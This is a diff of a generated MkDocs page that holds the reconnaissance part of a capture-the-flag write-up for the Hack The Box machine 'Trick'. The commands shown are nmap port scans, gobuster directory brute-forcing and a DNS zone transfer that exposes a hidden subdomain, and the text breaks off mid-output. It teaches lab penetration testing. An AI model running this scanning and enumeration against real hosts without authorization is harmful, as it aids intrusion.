@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17272,82 +17295,116 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </table>
 <h3 id="recon">Recon</h3>
 <p>First, we run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">ip</span><span class="o">=</span><span class="m">10</span>.10.11.166
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">ip</span><span class="o">=</span><span class="m">10</span>.10.11.166
+</span></code></pre></div></td></tr></table></div>
 <h4 id="service-port-enumeration">Service/ Port enumeration</h4>
 <p>Run nmap to enumerate open ports, services, OS and traceroute</p>
 <p>General enumeration not to make too much noise:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-Pn
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-Pn
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-19 13:31 EDT
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Nmap scan report for trick.htb (10.10.11.166)
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>Host is up (0.15s latency).
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>Not shown: 996 closed tcp ports (reset)
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>PORT   STATE SERVICE
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>22/tcp open  ssh
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>25/tcp open  smtp
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>53/tcp open  domain
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>80/tcp open  http
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
+<span class="normal"><a href="#__codelineno-2-2">2</a></span>
+<span class="normal"><a href="#__codelineno-2-3">3</a></span>
+<span class="normal"><a href="#__codelineno-2-4">4</a></span>
+<span class="normal"><a href="#__codelineno-2-5">5</a></span>
+<span class="normal"><a href="#__codelineno-2-6">6</a></span>
+<span class="normal"><a href="#__codelineno-2-7">7</a></span>
+<span class="normal"><a href="#__codelineno-2-8">8</a></span>
+<span class="normal"><a href="#__codelineno-2-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-19 13:31 EDT
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>Nmap scan report for trick.htb (10.10.11.166)
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>Host is up (0.15s latency).
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>Not shown: 996 closed tcp ports (reset)
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>PORT   STATE SERVICE
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a>22/tcp open  ssh
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a>25/tcp open  smtp
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a>53/tcp open  domain
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a>80/tcp open  http
+</span></code></pre></div></td></tr></table></div>
 <p>Once you know open ports, run nmap to see service versions and more details:   </p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nmap<span class="w"> </span>-sCV<span class="w"> </span>-p22,80,53,25<span class="w"> </span>-oN<span class="w"> </span>targeted<span class="w"> </span><span class="nv">$ip</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>nmap<span class="w"> </span>-sCV<span class="w"> </span>-p22,80,53,25<span class="w"> </span>-oN<span class="w"> </span>targeted<span class="w"> </span><span class="nv">$ip</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>PORT   STATE SERVICE VERSION
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>| ssh-hostkey:
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>25/tcp open  smtp    Postfix smtpd
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>| dns-nsid:
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
-</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>80/tcp open  http    nginx 1.14.2
-</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>|_http-title: Coming Soon - Start Bootstrap Theme
-</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>|_http-server-header: nginx/1.14.2
-</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-4-10">10</a></span>
+<span class="normal"><a href="#__codelineno-4-11">11</a></span>
+<span class="normal"><a href="#__codelineno-4-12">12</a></span>
+<span class="normal"><a href="#__codelineno-4-13">13</a></span>
+<span class="normal"><a href="#__codelineno-4-14">14</a></span>
+<span class="normal"><a href="#__codelineno-4-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>PORT   STATE SERVICE VERSION
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>| ssh-hostkey:
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a>|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a>|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a>25/tcp open  smtp    Postfix smtpd
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a>|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a>53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a>| dns-nsid:
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a>|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12"></a>80/tcp open  http    nginx 1.14.2
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13"></a>|_http-title: Coming Soon - Start Bootstrap Theme
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14"></a>|_http-server-header: nginx/1.14.2
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15"></a>Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></code></pre></div></td></tr></table></div>
 <h4 id="directory-enumeration">Directory enumeration</h4>
 <p>We can use gobuster to enumerate directories:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></code></pre></div></td></tr></table></div>
 <h4 id="dns-enumeration">dns enumeration</h4>
 <p>Run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>dnslookup
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>dnslookup
+</span></code></pre></div></td></tr></table></div>
 <p>And after that:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>&gt; SERVER 10.10.11.166
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>&gt; SERVER 10.10.11.166
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Default server: 10.10.11.166
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Address: 10.10.11.166#53
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
+<span class="normal"><a href="#__codelineno-8-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>Default server: 10.10.11.166
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>Address: 10.10.11.166#53
+</span></code></pre></div></td></tr></table></div>
 <p>Then, we run:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>&gt; 10.10.11.166
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>&gt; 10.10.11.166
+</span></code></pre></div></td></tr></table></div>
 <p>And as a result, we have:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>166.11.10.10.in-addr.arpa       name = trick.htb.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>166.11.10.10.in-addr.arpa       name = trick.htb.
+</span></code></pre></div></td></tr></table></div>
 <p>Now we have a dns name: trick.htb. We can dig it with:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>dig<span class="w"> </span>trick.htb<span class="w"> </span>axfr<span class="w"> </span>@10.10.11.166
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>dig<span class="w"> </span>trick.htb<span class="w"> </span>axfr<span class="w"> </span>@10.10.11.166
+</span></code></pre></div></td></tr></table></div>
 <p>And the results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>; &lt;&lt;&gt;&gt; DiG 9.18.6-2-Debian &lt;&lt;&gt;&gt; trick.htb axfr @10.10.11.166
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>;; global options: +cmd
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
-</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>trick.htb.              604800  IN      NS      trick.htb.
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>trick.htb.              604800  IN      A       127.0.0.1
-</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>trick.htb.              604800  IN      AAAA    ::1
-</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
-</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
-</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>;; Query time: 96 msec
-</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
-</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>;; WHEN: Wed Oct 19 13:20:24 EDT 2022
-</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>;; XFR size: 6 records (messages 1, bytes 231)
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-12-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-12-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-12-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-12-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-12-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-12-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-12-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-12-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-12-10">10</a></span>
+<span class="normal"><a href="#__codelineno-12-11">11</a></span>
+<span class="normal"><a href="#__codelineno-12-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>; &lt;&lt;&gt;&gt; DiG 9.18.6-2-Debian &lt;&lt;&gt;&gt; trick.htb axfr @10.10.11.166
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2"></a>;; global options: +cmd
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3"></a>trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4"></a>trick.htb.              604800  IN      NS      trick.htb.
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5"></a>trick.htb.              604800  IN      A       127.0.0.1
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6"></a>trick.htb.              604800  IN      AAAA    ::1
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7"></a>preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8"></a>trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9"></a>;; Query time: 96 msec
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10"></a>;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11"></a>;; WHEN: Wed Oct 19 13:20:24 EDT 2022
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12"></a>;; XFR size: 6 records (messages 1, bytes 231)
+</span></code></pre></div></td></tr></table></div>
 <p>Finally we have these dns domains:
 + trick.htb
 + preprod-payroll.trick.htb
@@ -17355,416 +17412,663 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h3 id="edit-etchosts-file">Edit /etc/hosts file</h3>
 <p>We add the given subdomain to our /etc/hosts file.
 First we open the /etc/hosts file with an editor. For instance, nano.</p>
-<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>sudo<span class="w"> </span>nano<span class="w"> </span>/etc/hosts
-</span></code></pre></div>
+<p><div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a>sudo<span class="w"> </span>nano<span class="w"> </span>/etc/hosts
+</span></code></pre></div></td></tr></table></div>
 We move the cursor to the end and we add these lines:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>10.10.11.166    trick.htb
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>10.10.11.166    preprod-payroll.trick.htb
-</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>10.10.11.166    root.trick.htb
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span>
+<span class="normal"><a href="#__codelineno-14-2">2</a></span>
+<span class="normal"><a href="#__codelineno-14-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a>10.10.11.166    trick.htb
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2"></a>10.10.11.166    preprod-payroll.trick.htb
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3"></a>10.10.11.166    root.trick.htb
+</span></code></pre></div></td></tr></table></div>
 <p>Now we can use the browser to go to: http://preprod-payroll.trick.htb</p>
 <p>And start again with directory enumeration.</p>
 <h4 id="directory-enumeration_1">Directory enumeration</h4>
 <p>Run the dictionary:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://preprod-payroll.trick.htb<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://preprod-payroll.trick.htb<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>Dirs found with a 302 response:
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>/
-</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>
-</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>Dirs found with a 403 response:
-</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>
-</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>/assets/
-</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>/database/
-</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>/assets/vendor/
-</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>/assets/img/
-</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>/assets/vendor/jquery/
-</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>/assets/DataTables/
-</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a>/assets/vendor/bootstrap/
-</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a>/assets/vendor/bootstrap/js/
-</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a>/assets/vendor/jquery.easing/
-</span><span id="__span-16-16"><a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a>/assets/css/
-</span><span id="__span-16-17"><a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a>/assets/vendor/php-email-form/
-</span><span id="__span-16-18"><a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a>/assets/vendor/venobox/
-</span><span id="__span-16-19"><a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a>/assets/vendor/waypoints/
-</span><span id="__span-16-20"><a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a>/assets/vendor/counterup/
-</span><span id="__span-16-21"><a id="__codelineno-16-21" name="__codelineno-16-21" href="#__codelineno-16-21"></a>/assets/vendor/owl.carousel/
-</span><span id="__span-16-22"><a id="__codelineno-16-22" name="__codelineno-16-22" href="#__codelineno-16-22"></a>/assets/vendor/bootstrap-datepicker/
-</span><span id="__span-16-23"><a id="__codelineno-16-23" name="__codelineno-16-23" href="#__codelineno-16-23"></a>/assets/vendor/bootstrap-datepicker/js/
-</span><span id="__span-16-24"><a id="__codelineno-16-24" name="__codelineno-16-24" href="#__codelineno-16-24"></a>/assets/js/
-</span><span id="__span-16-25"><a id="__codelineno-16-25" name="__codelineno-16-25" href="#__codelineno-16-25"></a>/assets/font-awesome/
-</span><span id="__span-16-26"><a id="__codelineno-16-26" name="__codelineno-16-26" href="#__codelineno-16-26"></a>/assets/font-awesome/js/
-</span><span id="__span-16-27"><a id="__codelineno-16-27" name="__codelineno-16-27" href="#__codelineno-16-27"></a>/assets/vendor/owl.carousel/assets/
-</span><span id="__span-16-28"><a id="__codelineno-16-28" name="__codelineno-16-28" href="#__codelineno-16-28"></a>/assets/vendor/bootstrap/css/
-</span><span id="__span-16-29"><a id="__codelineno-16-29" name="__codelineno-16-29" href="#__codelineno-16-29"></a>/assets/vendor/bootstrap-datepicker/css/
